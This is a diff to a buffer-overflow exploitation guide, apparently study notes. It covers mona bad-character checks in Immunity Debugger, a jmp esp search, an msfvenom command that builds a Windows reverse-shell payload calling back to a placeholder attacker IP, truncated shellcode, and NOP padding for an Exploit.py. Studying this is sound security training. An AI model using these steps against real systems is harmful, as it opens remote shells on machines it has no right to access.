@@ -123,9 +123,11 @@ for x in range(1, 256):
 print()z
 ```
 
+In Immunity Debugger:
+
 ```shell
-$ !mona bytearray -b "\x00< + bad chars>"
-$ !mona compare -f C:\mona\%p\bytearray.bin -a <address>
+!mona bytearray -b "\x00< + bad chars>"
+!mona compare -f C:\mona\%p\bytearray.bin -a <address>
 ```
 
 Close bytes can also corrupt near ones. Remove the first byte from the pair and retry. For example if you have 0x1a0x1b, remove 0x1a first then rerun the test.
@@ -140,15 +142,22 @@ $!mona jmp -r esp
 
 ```shell
 $ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<found bad chars>" -f c
+
+"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
+.
+.
+.
+"\x83\x39\x6d";
+
 ```
 
-Add payload to **_Exploit.py_** > payload = ("****\_****")
+Add payload to **_Exploit.py_** > payload = ("\***\*\_\*\***")
 
 ### Extra
 
 Maybe add some prepend NOPs to **_Exploit.py_**
 
 ```shell
-overflow = "\x90" _ <overflow>
-padding = "\x90" _ 16
+overflow = "\x90" * <overflow>
+padding = "\x90" * 16
 ```
